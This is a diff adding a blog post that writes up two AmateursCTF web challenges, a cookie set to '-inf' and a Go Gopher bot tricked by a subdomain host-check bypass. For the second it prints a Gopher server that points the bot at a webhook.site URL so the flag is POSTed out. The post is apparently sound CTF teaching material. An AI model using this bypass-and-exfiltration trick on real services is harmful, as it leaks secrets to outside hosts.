@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>AmateursCTF Web Writeup | cjxol.com</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="AmateursCTF Web Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="AmateursCTF Event on CTFtime" />
+<meta property="og:description" content="AmateursCTF Event on CTFtime" />
+<link rel="canonical" href="https://www.cjxol.com/posts/amateursctf-web-writeup/" />
+<meta property="og:url" content="https://www.cjxol.com/posts/amateursctf-web-writeup/" />
+<meta property="og:site_name" content="cjxol.com" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-25T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="AmateursCTF Web Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-25T00:00:00+01:00","datePublished":"2023-07-25T00:00:00+01:00","description":"AmateursCTF Event on CTFtime","headline":"AmateursCTF Web Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cjxol.com/posts/amateursctf-web-writeup/"},"url":"https://www.cjxol.com/posts/amateursctf-web-writeup/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cjxol.com/feed.xml" title="cjxol.com" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">cjxol.com</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">AmateursCTF Web Writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-07-25T00:00:00+01:00" itemprop="datePublished">Jul 25, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><a href="https://ctf.amateurs.team/">AmateursCTF</a><br />
+<a href="https://ctftime.org/event/1983">Event on CTFtime</a></p>
+
+<p>3 web challenge writeups in this post:</p>
+<ul>
+  <li><a href="#wait-an-eternity">wait-an-eternity</a></li>
+  <li><a href="#go-gopher">go-gopher</a></li>
+</ul>
+
+<h2 id="wait-an-eternity">wait-an-eternity</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I’ve been waiting a couple days and it’s still asking me to wait. I’m getting a little impatient, could you help me get the flag?</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+  <li>Entry point: <a href="https://waiting-an-eternity.amt.rs/">waiting-an-eternity.amt.rs</a></li>
+</ul>
+
+<h3 id="first-eternity">First eternity</h3>
+
+<p>The webpage just had text “just wait an eternity”. When inspect the request, there is a “Refresh” header with a huge value and url with a secret code.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/first-eternity.png" alt="First eternity" /></p>
+
+<h3 id="another-eternity">Another eternity</h3>
+
+<p>Visit the url in the “Refresh” header, it shows a page saying “welcome. please wait another eternity.”.</p>
+
+<p>Inspect the request, it sets a cookie “time” with a value appears to be the current timestamp like <code class="highlighter-rouge">1690326049.1573777</code>. With the cookie set, refresh the page, and the page shows text like “you have not waited an eternity. you have only waited 228.13574051856995 seconds”. The time mentioned in the message appears to be the difference between the current timestamp and the timestamp in the cookie.</p>
+
+<p>Sets the cookie to a large value, it says have only waited a large negative number of seconds. Sets the cookie to a negative value, it says have waited a large number of seconds, but there is still no flag.</p>
+
+<p>The message told to wait an eternity, but how long is an eternity? The internet says the definitions of eternity is “<a href="https://www.dictionary.com/browse/eternity">infinite time</a>”, “<a href="https://dictionary.cambridge.org/dictionary/english/eternity">time that never ends</a>” or “a very long time”. Hmm, how long the website would consider to be an eternity? Look up gunicorn that appears to be the web server according to the response header, the website is running Python. In Python, a number (except <code class="highlighter-rouge">-inf</code>) minus <code class="highlighter-rouge">-inf</code> would be <code class="highlighter-rouge">inf</code>. So, if the cookie value is <code class="highlighter-rouge">-inf</code>, the number of seconds have waited would be <code class="highlighter-rouge">inf</code>, and website would consider it to be an eternity.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/another-eternity.png" alt="Another eternity" /></p>
+
+<p>After two eternities, I got the flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
+</code></pre></div></div>
+
+<h4 id="speculation">Speculation</h4>
+
+<p>The web server is probably taking value from the cookie, and use <code class="highlighter-rouge">float()</code> to convert it to a float, thus <code class="highlighter-rouge">float('-inf')</code> would be float <code class="highlighter-rouge">-inf</code>. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the <a href="https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18">source code</a>)</p>
+
+<h2 id="go-gopher">go-gopher</h2>
+
+<ul>
+  <li>Description:
+    <blockquote>
+      <p>psst… i know flag sharing isn’t allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.</p>
+    </blockquote>
+  </li>
+  <li>Author: voxal</li>
+  <li>Entry point:
+    <ul>
+      <li>gopher://amt.rs:31290/</li>
+      <li><a href="https://gopher-bot.amt.rs/">gopher-bot.amt.rs</a></li>
+    </ul>
+  </li>
+  <li>Downloads:
+    <ul>
+      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/7c93488d980366dd6255b08e1bb8ac751565508920151011276c964116df5479/bot.go">bot.go</a></li>
+      <li><a href="https://amateurs-prod.storage.googleapis.com/uploads/b652421619610ac09116d516ac4f659ac95d73402048c96e29cfb2ad183104f7/main.go">main.go</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="the-challenge">The challenge</h3>
+
+<p>Submit and Visit function for bot</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="n">Submit</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">r</span><span class="o">.</span><span class="n">ParseForm</span><span class="p">()</span>
+	<span class="n">u</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">||</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">Host</span><span class="p">,</span> <span class="s">"amt.rs"</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"Invalid url"</span><span class="p">))</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+	<span class="n">w</span><span class="o">.</span><span class="n">Write</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">Visit</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">Form</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="s">"url"</span><span class="p">))))</span>
+<span class="p">}</span>
+<span class="k">func</span> <span class="n">Visit</span><span class="p">(</span><span class="n">url</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="n">res</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">gopher</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"Something went wrong: %s"</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+	<span class="p">}</span>
+	<span class="n">h</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">ToText</span><span class="p">()</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">h</span><span class="p">))</span>
+	<span class="n">url</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">strings</span><span class="o">.</span><span class="n">CutPrefix</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">Dir</span><span class="o">.</span><span class="n">Items</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Selector</span><span class="p">,</span> <span class="s">"URL:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+	<span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">Post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="n">bytes</span><span class="o">.</span><span class="n">NewBuffer</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="s">"Failed to make request"</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="s">"Successful visit"</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.</p>
+
+<p>The bot does restrict the host of the Gopher url to start with <code class="highlighter-rouge">amt.rs</code>, however this can be easily bypassed with subdomain like <code class="highlighter-rouge">gopher://amt.rs.cjxol.com:31290/</code>. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.</p>
+
+<p><img src="/assets/image/amateursctf-web-writeup/go-gopher-flag.png" alt="go-gopher flag" /></p>
+
+<p>Here is my Gopher server code:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+<span class="k">import</span> <span class="p">(</span>
+        <span class="s">"fmt"</span>
+        <span class="s">"log"</span>
+        <span class="s">"git.mills.io/prologic/go-gopher"</span>
+<span class="p">)</span>
+<span class="k">func</span> <span class="n">hello</span><span class="p">(</span><span class="n">w</span> <span class="n">gopher</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">gopher</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"Hello!"</span><span class="p">)</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteInfo</span><span class="p">(</span><span class="s">"again"</span><span class="p">)</span>
+        <span class="n">w</span><span class="o">.</span><span class="n">WriteItem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gopher</span><span class="o">.</span><span class="n">Item</span><span class="p">{</span>
+                <span class="n">Selector</span><span class="o">:</span>       <span class="s">"https://webhook.site/[reducted]"</span><span class="p">,</span>
+        <span class="p">})</span>
+        <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"hello"</span><span class="p">)</span>
+<span class="p">}</span>
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">gopher</span><span class="o">.</span><span class="n">HandleFunc</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">hello</span><span class="p">)</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">gopher</span><span class="o">.</span><span class="n">ListenAndServe</span><span class="p">(</span><span class="s">"0.0.0.0:31337"</span><span class="p">,</span> <span class="no">nil</span><span class="p">))</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here is the Gopher response:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iHello!         error.host      1
+iagain          error.host      1
+        https://webhook.site/[reducted]       ::      31337
+.
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/posts/amateursctf-web-writeup/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">cjxol.com</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">cjxol.com</li><li><a class="u-email" href="mailto:i@cjxol.com">i@cjxol.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/allc"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">allc</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
